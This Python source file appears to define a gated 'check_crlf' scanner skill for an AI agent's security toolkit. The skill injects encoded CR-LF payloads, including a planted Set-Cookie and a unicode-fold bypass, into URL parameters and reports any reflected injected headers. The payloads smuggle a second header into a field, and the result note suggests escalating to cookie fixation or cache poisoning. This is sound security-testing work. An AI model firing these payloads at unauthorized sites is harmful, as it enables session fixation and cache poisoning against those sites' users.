"""CRLF injection / HTTP response splitting — smuggling a CR-LF into a param that lands in a header.

check_crlf injects carriage-return/line-feed payloads (encoded, double-cased, and the unicode-fold
bypass) into a target's parameters and checks whether the server reflects them as a *real* new
response header — an injected marker header or a planted Set-Cookie. A hit is a confirmed CRLF
injection: the app copies user input into a response header without stripping CR-LF, which enables
header injection, Set-Cookie fixation, web-cache poisoning and response-splitting XSS. Active (sends
crafted requests) so it is gated. Pure-stdlib (urllib), CI-safe, $0. Confirm impact before report.
"""

from __future__ import annotations

import asyncio
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from friday.skills.registry import skill

_MARKER = "x-sutra-crlf"  # the header we try to smuggle in; its presence proves the split
_PAYLOADS = (
    f"%0d%0a{_MARKER}:injected",  # encoded CR-LF + injected header
    f"%0D%0A{_MARKER}:injected",  # upper-case hex (some filters only match lower)
    f"val%0d%0a{_MARKER}:injected",  # legit-looking value first, then the split
    f"%0d%0aSet-Cookie:{_MARKER}=injected",  # plant a cookie (session fixation vector)
    f"%E5%98%8A%E5%98%8D{_MARKER}:injected",  # unicode CR-LF (U+560A/560D) that some stacks fold
)
# Parameters that commonly get reflected into a response header (redirect/lang/etc.).
_HEADER_PARAMS = frozenset(
    {"redirect", "url", "next", "return", "lang", "locale", "goto", "page", "host", "q", "ref"}
)
_DEFAULT_APPEND = ("redirect", "url", "lang", "q", "next", "page")


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a: Any, **k: Any) -> None:  # read the raw response headers
        return None


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    # keep our %0d%0a / %25 / %E5 sequences intact rather than re-encoding the percents
    return urlunparse(parts._replace(query=urlencode(q, safe="%:=")))


def _probe(url: str) -> tuple[int, list[tuple[str, str]], str | None]:
    """(status, header tuples incl. duplicate Set-Cookie, error) without following redirects."""
    opener = urllib.request.build_opener(_NoRedirect)
    req = urllib.request.Request(url, headers={"User-Agent": "sutra-crlf/1.0"})
    try:
        with opener.open(req, timeout=10) as r:  # noqa: S310 — authorized target
            return r.status, list(r.headers.items()), None
    except urllib.error.HTTPError as e:
        return e.code, list(e.headers.items()), None
    except (urllib.error.URLError, OSError) as e:
        return 0, [], str(e)[:160]


def _injected(headers: list[tuple[str, str]]) -> str | None:
    """Return the offending header line if our marker landed as a real response header."""
    for k, v in headers:
        if k.lower() == _MARKER:
            return f"{k}: {v}"
        if k.lower() == "set-cookie" and f"{_MARKER}=injected" in v.lower():
            return f"{k}: {v}"
    return None


@skill(
    name="check_crlf",
    description=(
        "Test a URL for CRLF injection / HTTP response splitting — smuggling a CR-LF into a "
        "parameter that gets copied into a response header. Injects encoded CR-LF payloads (plus "
        "upper-case-hex and unicode-fold bypasses) into the URL's parameters and checks whether "
        "the server returns a real injected header or a planted Set-Cookie. A hit is confirmed: "
        "enables header injection, cookie fixation, cache poisoning and response-splitting XSS. "
        "Pass param= to test one parameter. Active (crafted requests) — authorized targets only."
    ),
    auto_confirm=False,  # sends crafted CR-LF payloads — gated
    timeout_s=60,
)
async def check_crlf(url: str, param: str = "") -> dict[str, Any]:
    """Probe a URL's parameters for CRLF injection.

    url: the target URL (ideally one with a redirect/lang-style param, e.g. https://x/?redirect=/a).
    param: optional single parameter to test; otherwise the URL's header-looking params are used,
        or a small common set is appended when none are present.
    """
    url = (url or "").strip()
    if not url:
        return {"error": "no url to test"}
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    existing = [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]
    if param.strip():
        candidates = [param.strip()]
    else:
        candidates = [p for p in existing if p.lower() in _HEADER_PARAMS] or list(_DEFAULT_APPEND)

    def _run() -> tuple[list[dict[str, Any]], bool]:
        hits: list[dict[str, Any]] = []
        reachable = False
        for p in candidates:
            for payload in _PAYLOADS:
                test_url = _with_param(url, p, payload)
                status, headers, err = _probe(test_url)
                if err is None:
                    reachable = True
                line = _injected(headers)
                if line:
                    hits.append(
                        {"param": p, "payload": payload, "status": status,
                         "evidence": line[:160], "test_url": test_url}
                    )
                    break  # this param is confirmed — stop trying payloads on it
        return hits, reachable

    hits, reachable = await asyncio.to_thread(_run)
    if not reachable:
        return {"error": f"could not reach {url}", "url": url}

    findings = [
        {
            "id": "crlf-injection",
            "severity": "high",
            "matched_at": h["test_url"],
            "name": f"CRLF injection via '{h['param']}'",
            "description": (
                f"The '{h['param']}' parameter is copied into a response header without stripping "
                f"CR-LF: payload '{h['payload']}' produced an injected header ({h['evidence']}). "
                "Enables header injection, Set-Cookie fixation, cache poisoning and "
                "response-splitting XSS."
            ),
            "curl": f"curl -is '{h['test_url']}'",
        }
        for h in hits
    ]

    return {
        "url": url,
        "tested_params": candidates,
        "hits": hits,
        "findings": findings,
        "vulnerable": bool(findings),
        "note": (
            "Confirmed by a smuggled header landing in the response. Escalate to a planted "
            "Set-Cookie or cache poisoning to show real impact before reporting."
        ),
    }
